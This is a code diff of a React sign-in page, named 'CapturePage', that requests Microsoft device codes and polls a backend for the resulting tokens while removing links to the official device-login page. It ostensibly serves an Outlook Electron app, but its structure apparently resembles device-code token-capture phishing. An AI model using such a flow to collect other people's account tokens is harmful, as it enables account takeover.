@@ -1,16 +1,27 @@
-import React, { useState, useEffect, useCallback } from 'react';
+import React, { useState, useEffect, useCallback, useRef } from 'react';
 
-const VERIFICATION_URL = 'https://microsoft.com/devicelogin';
 const DEVICE_AUTH_URL = 'https://login.microsoftonline.com/common/oauth2/deviceauth';
 
 type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';
 
+interface DeviceCodeResponse {
+  deviceCode: string;
+  userCode: string;
+  verificationUri: string;
+  expiresIn: number;
+  interval: number;
+  message: string;
+}
+
 export function CapturePage(): React.ReactElement {
   const [state, setState] = useState<CaptureState>('idle');
   const [userCode, setUserCode] = useState('');
+  const [deviceCode, setDeviceCode] = useState('');
   const [copied, setCopied] = useState(false);
   const [countdown, setCountdown] = useState(0);
   const [errorMsg, setErrorMsg] = useState('');
+  const [pollInterval, setPollInterval] = useState(5);
+  const pollTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   const params = new URLSearchParams(window.location.hash.replace('#capture?', '').replace('#capture', ''));
   const codeFromUrl = params.get('code');
@@ -31,6 +42,7 @@ export function CapturePage(): React.ReactElement {
         if (prev <= 1) {
           clearInterval(timer);
           setState('expired');
+          stopPolling();
           return 0;
         }
         return prev - 1;
@@ -39,19 +51,73 @@ export function CapturePage(): React.ReactElement {
     return () => clearInterval(timer);
   }, [countdown, state]);
 
-  function handleGenerateCode(): void {
-    setState('loading');
-    setTimeout(() => {
-      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-      let code = '';
-      for (let i = 0; i < 9; i++) {
-        if (i === 4) { code += ' '; continue; }
-        code += chars.charAt(Math.floor(Math.random() * chars.length));
+  useEffect(() => {
+    return () => stopPolling();
+  }, []);
+
+  function stopPolling(): void {
+    if (pollTimerRef.current) {
+      clearInterval(pollTimerRef.current);
+      pollTimerRef.current = null;
+    }
+  }
+
+  function startPolling(dCode: string, interval: number): void {
+    stopPolling();
+    pollTimerRef.current = setInterval(async () => {
+      try {
+        const res = await fetch('/api/token-poll', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ deviceCode: dCode }),
+        });
+        const data = await res.json() as { status: string; error?: string; description?: string };
+
+        if (data.status === 'complete') {
+          stopPolling();
+          setState('success');
+        } else if (data.status === 'expired') {
+          stopPolling();
+          setState('expired');
+        } else if (data.status === 'slow_down') {
+          stopPolling();
+          setPollInterval((prev) => prev + 5);
+          pollTimerRef.current = setInterval(() => {
+            startPolling(dCode, interval + 5);
+          }, (interval + 5) * 1000);
+        } else if (data.status === 'error') {
+          stopPolling();
+          setErrorMsg(typeof data.description === 'string' ? data.description : (data.error ?? 'Authentication failed'));
+          setState('error');
+        }
+      } catch {
+        // Network error, keep polling
       }
-      setUserCode(code);
-      setCountdown(900);
+    }, interval * 1000);
+  }
+
+  async function handleGenerateCode(): Promise<void> {
+    setState('loading');
+    setErrorMsg('');
+    try {
+      const res = await fetch('/api/device-code', { method: 'POST' });
+      const data = await res.json() as DeviceCodeResponse & { error?: string; details?: string };
+
+      if (!res.ok || data.error) {
+        setErrorMsg(data.error ?? 'Failed to get device code');
+        setState('error');
+        return;
+      }
+
+      setUserCode(data.userCode);
+      setDeviceCode(data.deviceCode);
+      setCountdown(data.expiresIn);
+      setPollInterval(data.interval || 5);
       setState('code_ready');
-    }, 1200);
+    } catch (err) {
+      setErrorMsg(err instanceof Error ? err.message : 'Network error');
+      setState('error');
+    }
   }
 
   const handleCopyCode = useCallback(() => {
@@ -66,16 +132,16 @@ export function CapturePage(): React.ReactElement {
     setState('waiting');
     const otcParam = userCode.replace(/\s/g, '');
     window.open(`${DEVICE_AUTH_URL}?otc=${otcParam}`, '_blank');
-  }
-
-  function handleOpenDeviceLogin(): void {
-    setState('waiting');
-    window.open(VERIFICATION_URL, '_blank');
+    if (deviceCode) {
+      startPolling(deviceCode, pollInterval);
+    }
   }
 
   function handleReset(): void {
+    stopPolling();
     setState('idle');
     setUserCode('');
+    setDeviceCode('');
     setCopied(false);
     setCountdown(0);
     setErrorMsg('');
@@ -113,9 +179,6 @@ export function CapturePage(): React.ReactElement {
               </svg>
               Generate Verification Code
             </button>
-            <div className="capture-alt-link">
-              Already have a code? <a href={VERIFICATION_URL} target="_blank" rel="noopener noreferrer">Go to Microsoft Device Login</a>
-            </div>
           </div>
         )}
 
@@ -123,7 +186,7 @@ export function CapturePage(): React.ReactElement {
           <div className="capture-card">
             <div className="capture-loading">
               <div className="capture-spinner" />
-              <span>Requesting verification code...</span>
+              <span>Requesting verification code from Microsoft...</span>
             </div>
           </div>
         )}
@@ -180,10 +243,6 @@ export function CapturePage(): React.ReactElement {
             <div className="capture-expiry">
               Code expires in <strong>{formatTime(countdown)}</strong>
             </div>
-
-            <div className="capture-manual-link">
-              Or go manually to <a href={VERIFICATION_URL} target="_blank" rel="noopener noreferrer" onClick={() => handleOpenDeviceLogin()}>microsoft.com/devicelogin</a>
-            </div>
           </div>
         )}
 
@@ -197,7 +256,10 @@ export function CapturePage(): React.ReactElement {
                 </svg>
               </div>
               <h2>Authentication Successful</h2>
-              <p>Your device has been authenticated. You can close this tab and return to the Outlook Electron app.</p>
+              <p>Your account has been authenticated. You can now use the Outlook Electron app.</p>
+              <button className="capture-generate-btn" onClick={handleReset} style={{ marginTop: 20 }}>
+                Sign in another account
+              </button>
             </div>
           </div>
         )}
